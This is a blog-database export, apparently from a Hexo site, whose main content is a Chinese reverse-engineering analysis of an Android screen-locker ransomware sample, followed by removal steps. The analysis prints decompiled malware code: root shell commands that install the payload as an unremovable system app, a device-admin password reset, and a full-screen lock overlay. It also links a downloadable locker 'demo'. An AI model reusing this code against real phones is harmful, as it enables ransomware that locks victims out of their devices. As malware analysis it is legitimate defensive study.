rel=\"noopener\">https://github.com/Y00z/react-navie_toilet</a></li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;个人的一个React-Native项目，前几天买了一台ipad的,正好同时适配了ios/android两个平台并且进行了优化。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过调用高德地图LBS定位并且寻找附近的厕所自动导航，同时支持阅读新闻，定位获取城区天气等，使用官方推荐的react-navigation和最新的FlatList组件，并且使用的是reate-react-native-app模式开发的app，这个模式在上一篇文章有介绍<a href=\"https://y00z.github.io/2017/07/19/diary-2017-0719-01/\">(点我)</a>，代码及其紧凑扩展性强(官推的导航组件太好用了)，同时感谢vczero大哥提供的学习资料素材。</p>\n</blockquote>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><ul>\n<li>服务器<ul>\n<li>NodeJs</li>\n<li>express4</li>\n<li>mongodb</li>\n</ul>\n</li>\n</ul>","more":"<p>服务器同时用了session持久化，把用户登录状态保存起来，帐号密码并没有植入到数据库中，而是固定的帐号admin，密码123456<br>目前只是用户录入的新闻数据是存储在数据库中的，因为服务器并不是项目中的主要。<br>之前也有发过Nodejs电影站的开源项目，里面所有数据是全部都存入到数据库中的<a href=\"https://y00z.github.io/2016/12/20/diary-2016-1220-01/\">(点我)</a></p>\n<ul>\n<li>app客户端<ul>\n<li>FlatList</li>\n<li>react-navigation</li>\n<li>高德地图api</li>\n</ul>\n</li>\n</ul>\n<p>同时适配了ios/android两个平台并且进行了优化，使用的reate-react-native-app模式开发,该模式详情<a href=\"https://y00z.github.io/2017/07/19/diary-2017-0719-01/\">(点我)</a></p>\n<ul>\n<li>运行<ul>\n<li>服务端运行<ul>\n<li>npm install</li>\n<li>mongod –dbpath D:\\db </li>\n<li>node app</li>\n</ul>\n</li>\n<li>客户端运行<ul>\n<li>npm install</li>\n<li>npm start</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><blockquote>\n<ul>\n<li>android</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/2017-07-26-01-android.gif\" alt></p>\n<blockquote>\n<ul>\n<li>ios</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/2017-07-26-01-ios.gif\" alt> </p>\n<h4 id=\"项目源码地址\"><a href=\"#项目源码地址\" class=\"headerlink\" title=\"项目源码地址\"></a>项目源码地址</h4><ul>\n<li>服务端<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_toilet_server\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_toilet_server</a></li>\n</ul>\n</li>\n<li>app客户端<ul>\n<li><a href=\"https://github.com/Y00z/react-navie_toilet\" target=\"_blank\" rel=\"noopener\">https://github.com/Y00z/react-navie_toilet</a></li>\n</ul>\n</li>\n</ul>"},{"layout":"post","title":"对安卓锁机恶意程序反编译分析","date":"2017-01-08T06:08:50.000Z","comments":1,"_content":"\n## 前言\n>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。\n>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。\n\n## 正文\n>锁机恶意程序一共分为两种：\n1、通过设备管理器锁机加密码<!--more-->\n2、设置一个view至栈顶端。\n\n### 第一种\n> 在上一篇博文中的安全卫士中有用到这个设备管理器。\n> 原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。\n\n\n### 第二种\n> 这种也就是这篇博文主要讲的了。\n> ApkTool用来逆向反编译。\n> 主要文件，混淆了方法名和类名。\n> ![](/images/1.8/01.png)\n> ![](/images/1.8/02.png)\n> 重要的是ijm-x86.so这个so文件,后面有讲解\n> 先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码\n```java\n  @Override\n  protected void onCreate(Bundle paramBundle)\n  {\n    LogCatBroadcaster.start(this);\n    super.onCreate(paramBundle);\n    setContentView(2130903040);\n    this.b = ((Button)findViewById(2131099651));\n    this.t = ((EditText)findViewById(0));\n    Button localButton = this.b;\n    ButtonClickListener localButtonClickListener = new ButtonClickListener();\n    localButton.setOnClickListener(localButtonClickListener);\n    try\n    {\n      StringBuffer localStringBuffer = new StringBuffer();\n      d(this.path + \"/zihao.l\");\n      return;\n    }\n    catch (IOException localIOException)\n    {\n    }\n  }\n```\n> this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。\n> \n```java\n  private void d(String paramString)\n    throws IOException\n  {\n    FileOutputStream localFileOutputStream = new FileOutputStream(paramString);\n    InputStream localInputStream = getAssets().open(\"ijm-x86.so\");\n    byte[] arrayOfByte = new byte[1024];\n    for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte))\n    {\n      if (i <= 0)\n      {\n        localFileOutputStream.flush();\n        localInputStream.close();\n        localFileOutputStream.close();\n        return;\n      }\n      localFileOutputStream.write(arrayOfByte, 0, i);\n    }\n  }\n```\n> 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l\n> 再来看看ButtonClickListener的点击事件。\n```java\n    private final class ButtonClickListener\n    implements View.OnClickListener\n  {\n    public ButtonClickListener()\n    {\n    }\n\n    @Override\n    public void onClick(View paramView)\n    {\n      b localb = new b();\n      localb.rootShell();\n      a.deleteFile(c.this.file);\n    }\n  }\n```\n>执行了b对象中的rootShell方法。我们继续跟进。\n```java\n  void rootShell()\n  {\n    execCommand(new String[] { \"mount -o rw,remount /system\", \"mount -o rw,remount /system/app\", \"cp /sdcard/zihao.l /system/app/\", \"chmod 777 /system/app/zihao.l\", \"mv /system/app/zihao.l /system/app/zihao.apk\", \"chmod 644 /system/app/zihao.apk\", \"reboot\" }, true);\n  }\n```\n>很明显，这个是执行shell命令的代码。\n>先把/system 和 /system/app 设置可读可写。\n>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。\n>最后再重启。\n>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。\n>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。\n\n### 分析第二层\n>同样的手法，找到app的入口Activity.\n\n```java\n  @Override\n  public void onCreate(Bundle paramBundle)\n  {\n    LogCatBroadcaster.start(this);\n    super.onCreate(paramBundle);\n    activiteDevice();\n  }\n```\n\n继续跟进\n\n```java\n  private void activiteDevice()\n  {\n    Intent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");\n    NoClassDefFoundError localNoClassDefFoundError;\n    try\n    {\n      Class localClass = Class.forName(\"com.h.MyAdmin\");\n      ComponentName localComponentName = new ComponentName(this, localClass);\n      localIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", localComponentName);\n      startActivityForResult(localIntent, 0);\n      return;\n    }\n    catch (ClassNotFoundException localClassNotFoundException)\n    {\n      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());\n    }\n    throw localNoClassDefFoundError;\n  }\n```\n>操作打开激活设备管理器的界面\n\n>来看看MyAdmin里面的代码。\n\n```java\n @Override\n  public void onEnabled(Context paramContext, Intent paramIntent)\n  {\n    String str = Integer.toString(1997);\n    NoClassDefFoundError localNoClassDefFoundError;\n    try\n    {\n      Class localClass = Class.forName(\"com.h.s\");\n      Intent localIntent = new Intent(paramContext, localClass);\n      localIntent.setFlags(268435456);\n      paramContext.startService(localIntent);\n      getManager(paramContext).resetPassword(str, 0);\n      super.onEnabled(paramContext, paramIntent);\n      return;\n    }\n    catch (ClassNotFoundException localClassNotFoundException)\n    {\n      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());\n    }\n    throw localNoClassDefFoundError;\n  }\n```\n>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。\n>跟进看看这个服务做了些什么。\n>s里面杂乱代码太多，我们直接来看主要的。\n```java\n  private void c()\n  {\n    WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams();\n    this.wmParams = localLayoutParams;\n    Application localApplication = getApplication();\n    getApplication();\n    this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));\n    this.wmParams.type = 2010;\n    this.wmParams.format = 1;\n    this.wmParams.flags = 1280;\n    this.wmParams.gravity = 49;\n    this.wmParams.x = 0;\n    this.wmParams.y = 0;\n    this.wmParams.width = -1;\n    this.wmParams.height = -1;\n    this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null);\n    MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648);\n    localMediaPlayer.setLooping(true);\n    localMediaPlayer.start();\n    this.mWindowManager.addView(this.mFloatLayout, this.wmParams);\n    this.bt = ((Button)this.mFloatLayout.findViewById(2131361794));\n    this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792));\n    this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793));\n    try\n    {\n      this.ed.setHint(\"宝贝在这输入密码！\");\n      this.tv.append(\"恭喜中奖\");\n      Button localButton = this.bt;\n      100000001 local100000001 = new View.OnClickListener()\n      {\n        @Override\n        public void onClick(View paramView)\n        {\n          try\n          {\n            if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString(\"passw\", \"\"))))\n            {\n              s.access$L1000001(s.this).removeView(s.access$L1000002(s.this));\n              s.this.stopSelf();\n            }\n            return;\n          }\n          catch (Exception localException)\n          {\n          }\n        }\n      };\n      localButton.setOnClickListener(local100000001);\n    }\n    catch (Exception localException1)\n    {\n      try\n      {\n        TextView localTextView = this.tv;\n        StringBuffer localStringBuffer1 = new StringBuffer();\n        StringBuffer localStringBuffer2 = new StringBuffer();\n        localTextView.append(localStringBuffer2.append(\"\\n\").append(this.des.decrypt(\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\")).toString() + this.share.getLong(\"m\", 0));\n        return;\n        localException1 = localException1;\n      }\n      catch (Exception localException2)\n      {\n      }\n    }\n  }\n```\n> 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。\n> 重点：布局文件的type和flags属性。\n> 可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。\n\n## 总结\n>这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。\n>由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了\n\n## 解决办法。\n>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，\n>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。\n\n## 末尾\n>为了不让恶意程序流传，我就不分享源程序了。\n>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。\n链接: [http://pan.baidu.com/s/1mi0roJA](http://pan.baidu.com/s/1mi0roJA) 密码: 6xqi","source":"_posts/diary-2017-0108-01.md","raw":"---\nlayout: post\ntitle: 对安卓锁机恶意程序反编译分析\ndate: 2017-01-08 14:08:50\ncomments: true\ntags:\n\t- 安卓\n\t- 反编译\n---\n\n## 前言\n>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。\n>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。\n\n## 正文\n>锁机恶意程序一共分为两种：\n1、通过设备管理器锁机加密码<!--more-->\n2、设置一个view至栈顶端。\n\n### 第一种\n> 在上一篇博文中的安全卫士中有用到这个设备管理器。\n> 原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。\n\n\n### 第二种\n> 这种也就是这篇博文主要讲的了。\n> ApkTool用来逆向反编译。\n> 主要文件，混淆了方法名和类名。\n> ![](/images/1.8/01.png)\n> ![](/images/1.8/02.png)\n> 重要的是ijm-x86.so这个so文件,后面有讲解\n> 先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码\n```java\n  @Override\n  protected void onCreate(Bundle paramBundle)\n  {\n    LogCatBroadcaster.start(this);\n    super.onCreate(paramBundle);\n    setContentView(2130903040);\n    this.b = ((Button)findViewById(2131099651));\n    this.t = ((EditText)findViewById(0));\n    Button localButton = this.b;\n    ButtonClickListener localButtonClickListener = new ButtonClickListener();\n    localButton.setOnClickListener(localButtonClickListener);\n    try\n    {\n      StringBuffer localStringBuffer = new StringBuffer();\n      d(this.path + \"/zihao.l\");\n      return;\n    }\n    catch (IOException localIOException)\n    {\n    }\n  }\n```\n> this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。\n> \n```java\n  private void d(String paramString)\n    throws IOException\n  {\n    FileOutputStream localFileOutputStream = new FileOutputStream(paramString);\n    InputStream localInputStream = getAssets().open(\"ijm-x86.so\");\n    byte[] arrayOfByte = new byte[1024];\n    for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte))\n    {\n      if (i <= 0)\n      {\n        localFileOutputStream.flush();\n        localInputStream.close();\n        localFileOutputStream.close();\n        return;\n      }\n      localFileOutputStream.write(arrayOfByte, 0, i);\n    }\n  }\n```\n> 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l\n> 再来看看ButtonClickListener的点击事件。\n```java\n    private final class ButtonClickListener\n    implements View.OnClickListener\n  {\n    public ButtonClickListener()\n    {\n    }\n\n    @Override\n    public void onClick(View paramView)\n    {\n      b localb = new b();\n      localb.rootShell();\n      a.deleteFile(c.this.file);\n    }\n  }\n```\n>执行了b对象中的rootShell方法。我们继续跟进。\n```java\n  void rootShell()\n  {\n    execCommand(new String[] { \"mount -o rw,remount /system\", \"mount -o rw,remount /system/app\", \"cp /sdcard/zihao.l /system/app/\", \"chmod 777 /system/app/zihao.l\", \"mv /system/app/zihao.l /system/app/zihao.apk\", \"chmod 644 /system/app/zihao.apk\", \"reboot\" }, true);\n  }\n```\n>很明显，这个是执行shell命令的代码。\n>先把/system 和 /system/app 设置可读可写。\n>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。\n>最后再重启。\n>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。\n>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。\n\n### 分析第二层\n>同样的手法，找到app的入口Activity.\n\n```java\n  @Override\n  public void onCreate(Bundle paramBundle)\n  {\n    LogCatBroadcaster.start(this);\n    super.onCreate(paramBundle);\n    activiteDevice();\n  }\n```\n\n继续跟进\n\n```java\n  private void activiteDevice()\n  {\n    Intent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");\n    NoClassDefFoundError localNoClassDefFoundError;\n    try\n    {\n      Class localClass = Class.forName(\"com.h.MyAdmin\");\n      ComponentName localComponentName = new ComponentName(this, localClass);\n      localIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", localComponentName);\n      startActivityForResult(localIntent, 0);\n      return;\n    }\n    catch (ClassNotFoundException localClassNotFoundException)\n    {\n      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());\n    }\n    throw localNoClassDefFoundError;\n  }\n```\n>操作打开激活设备管理器的界面\n\n>来看看MyAdmin里面的代码。\n\n```java\n @Override\n  public void onEnabled(Context paramContext, Intent paramIntent)\n  {\n    String str = Integer.toString(1997);\n    NoClassDefFoundError localNoClassDefFoundError;\n    try\n    {\n      Class localClass = Class.forName(\"com.h.s\");\n      Intent localIntent = new Intent(paramContext, localClass);\n      localIntent.setFlags(268435456);\n      paramContext.startService(localIntent);\n      getManager(paramContext).resetPassword(str, 0);\n      super.onEnabled(paramContext, paramIntent);\n      return;\n    }\n    catch (ClassNotFoundException localClassNotFoundException)\n    {\n      localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage());\n    }\n    throw localNoClassDefFoundError;\n  }\n```\n>用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。\n>跟进看看这个服务做了些什么。\n>s里面杂乱代码太多，我们直接来看主要的。\n```java\n  private void c()\n  {\n    WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams();\n    this.wmParams = localLayoutParams;\n    Application localApplication = getApplication();\n    getApplication();\n    this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));\n    this.wmParams.type = 2010;\n    this.wmParams.format = 1;\n    this.wmParams.flags = 1280;\n    this.wmParams.gravity = 49;\n    this.wmParams.x = 0;\n    this.wmParams.y = 0;\n    this.wmParams.width = -1;\n    this.wmParams.height = -1;\n    this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null);\n    MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648);\n    localMediaPlayer.setLooping(true);\n    localMediaPlayer.start();\n    this.mWindowManager.addView(this.mFloatLayout, this.wmParams);\n    this.bt = ((Button)this.mFloatLayout.findViewById(2131361794));\n    this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792));\n    this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793));\n    try\n    {\n      this.ed.setHint(\"宝贝在这输入密码！\");\n      this.tv.append(\"恭喜中奖\");\n      Button localButton = this.bt;\n      100000001 local100000001 = new View.OnClickListener()\n      {\n        @Override\n        public void onClick(View paramView)\n        {\n          try\n          {\n            if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString(\"passw\", \"\"))))\n            {\n              s.access$L1000001(s.this).removeView(s.access$L1000002(s.this));\n              s.this.stopSelf();\n            }\n            return;\n          }\n          catch (Exception localException)\n          {\n          }\n        }\n      };\n      localButton.setOnClickListener(local100000001);\n    }\n    catch (Exception localException1)\n    {\n      try\n      {\n        TextView localTextView = this.tv;\n        StringBuffer localStringBuffer1 = new StringBuffer();\n        StringBuffer localStringBuffer2 = new StringBuffer();\n        localTextView.append(localStringBuffer2.append(\"\\n\").append(this.des.decrypt(\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\")).toString() + this.share.getLong(\"m\", 0));\n        return;\n        localException1 = localException1;\n      }\n      catch (Exception localException2)\n      {\n      }\n    }\n  }\n```\n> 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。\n> 重点：布局文件的type和flags属性。\n> 可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。\n\n## 总结\n>这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。\n>由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了\n\n## 解决办法。\n>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，\n>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。\n\n## 末尾\n>为了不让恶意程序流传，我就不分享源程序了。\n>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。\n链接: [http://pan.baidu.com/s/1mi0roJA](http://pan.baidu.com/s/1mi0roJA) 密码: 6xqi","slug":"diary-2017-0108-01","published":1,"updated":"2017-05-14T07:17:03.268Z","photos":[],"link":"","_id":"cjvhjxaba000xiny2x49y7tds","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。<br>当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>锁机恶意程序一共分为两种：<br>1、通过设备管理器锁机加密码<a id=\"more\"></a><br>2、设置一个view至栈顶端。</p>\n</blockquote>\n<h3 id=\"第一种\"><a href=\"#第一种\" class=\"headerlink\" title=\"第一种\"></a>第一种</h3><blockquote>\n<p>在上一篇博文中的安全卫士中有用到这个设备管理器。<br>原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。</p>\n</blockquote>\n<h3 id=\"第二种\"><a href=\"#第二种\" class=\"headerlink\" title=\"第二种\"></a>第二种</h3><blockquote>\n<p>这种也就是这篇博文主要讲的了。<br>ApkTool用来逆向反编译。<br>主要文件，混淆了方法名和类名。<br><img src=\"/images/1.8/01.png\" alt><br><img src=\"/images/1.8/02.png\" alt><br>重要的是ijm-x86.so这个so文件,后面有讲解<br>先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle paramBundle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  LogCatBroadcaster.start(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  <span class=\"keyword\">super</span>.onCreate(paramBundle);</span><br><span class=\"line\">  setContentView(<span class=\"number\">2130903040</span>);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.b = ((Button)findViewById(<span class=\"number\">2131099651</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.t = ((EditText)findViewById(<span class=\"number\">0</span>));</span><br><span class=\"line\">  Button localButton = <span class=\"keyword\">this</span>.b;</span><br><span class=\"line\">  ButtonClickListener localButtonClickListener = <span class=\"keyword\">new</span> ButtonClickListener();</span><br><span class=\"line\">  localButton.setOnClickListener(localButtonClickListener);</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    StringBuffer localStringBuffer = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">    d(<span class=\"keyword\">this</span>.path + <span class=\"string\">\"/zihao.l\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (IOException localIOException)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">d</span><span class=\"params\">(String paramString)</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"keyword\">throws</span> IOException</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  FileOutputStream localFileOutputStream = <span class=\"keyword\">new</span> FileOutputStream(paramString);</span><br><span class=\"line\">  InputStream localInputStream = getAssets().open(<span class=\"string\">\"ijm-x86.so\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">byte</span>[] arrayOfByte = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte))</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      localFileOutputStream.flush();</span><br><span class=\"line\">      localInputStream.close();</span><br><span class=\"line\">      localFileOutputStream.close();</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    localFileOutputStream.write(arrayOfByte, <span class=\"number\">0</span>, i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l<br>再来看看ButtonClickListener的点击事件。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ButtonClickListener</span></span></span><br><span class=\"line\"><span class=\"class\">  <span class=\"keyword\">implements</span> <span class=\"title\">View</span>.<span class=\"title\">OnClickListener</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ButtonClickListener</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@Override</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View paramView)</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    b localb = <span class=\"keyword\">new</span> b();</span><br><span class=\"line\">    localb.rootShell();</span><br><span class=\"line\">    a.deleteFile(c.<span class=\"keyword\">this</span>.file);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>执行了b对象中的rootShell方法。我们继续跟进。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rootShell</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  execCommand(<span class=\"keyword\">new</span> String[] &#123; <span class=\"string\">\"mount -o rw,remount /system\"</span>, <span class=\"string\">\"mount -o rw,remount /system/app\"</span>, <span class=\"string\">\"cp /sdcard/zihao.l /system/app/\"</span>, <span class=\"string\">\"chmod 777 /system/app/zihao.l\"</span>, <span class=\"string\">\"mv /system/app/zihao.l /system/app/zihao.apk\"</span>, <span class=\"string\">\"chmod 644 /system/app/zihao.apk\"</span>, <span class=\"string\">\"reboot\"</span> &#125;, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>很明显，这个是执行shell命令的代码。<br>先把/system 和 /system/app 设置可读可写。<br>再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。<br>最后再重启。<br>/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。<br>这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。</p>\n</blockquote>\n<h3 id=\"分析第二层\"><a href=\"#分析第二层\" class=\"headerlink\" title=\"分析第二层\"></a>分析第二层</h3><blockquote>\n<p>同样的手法，找到app的入口Activity.</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span 